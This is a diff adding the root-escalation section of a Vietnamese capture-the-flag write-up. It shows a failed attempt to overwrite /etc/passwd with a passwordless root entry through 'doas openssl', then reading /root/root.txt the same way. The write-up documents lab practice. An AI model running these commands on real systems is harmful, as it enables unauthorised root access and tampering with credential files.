@@ -90,3 +90,24 @@ Nhận thấy rằng **doas** là một chương trình thay thế cho **sudo** 
 
 Openssl được cho phép chạy với quyền sudo mà không cần mật khẩu, ta sẽ tìm cách leo thang đặc quyền thông qua nó tham khảo [GTFOBINS](https://gtfobins.github.io/gtfobins/openssl/)
 
+Sau khi thử để leo thang đặc quyền với việc ghi đè file /etc/passwd không thành công, điều này tôi vẫn chưa rõ xảy ra vấn đề gì nhưng hiện tại ta sẽ tìm phương án khác
+```sh
+plot_admin@plotted:~$ LFILE=/etc/passwd
+LFILE=/etc/passwd
+plot_admin@plotted:~$ echo "root::0:0:root:/root:/bin/bash" | doas -u root openssl enc -out "$LFILE"
+</bin/bash" | doas -u root openssl enc -out "$LFILE"
+plot_admin@plotted:~$ su root
+su root
+Password: 
+su: Authentication failure
+```
+
+Ta sẽ đọc file thông qua file read
+![File read](./img/file-read.png)
+
+
+## root.txt
+
+> doas -u root openssl enc -in /root/root.txt
+
+![Root flag](./img/root-flag.png)
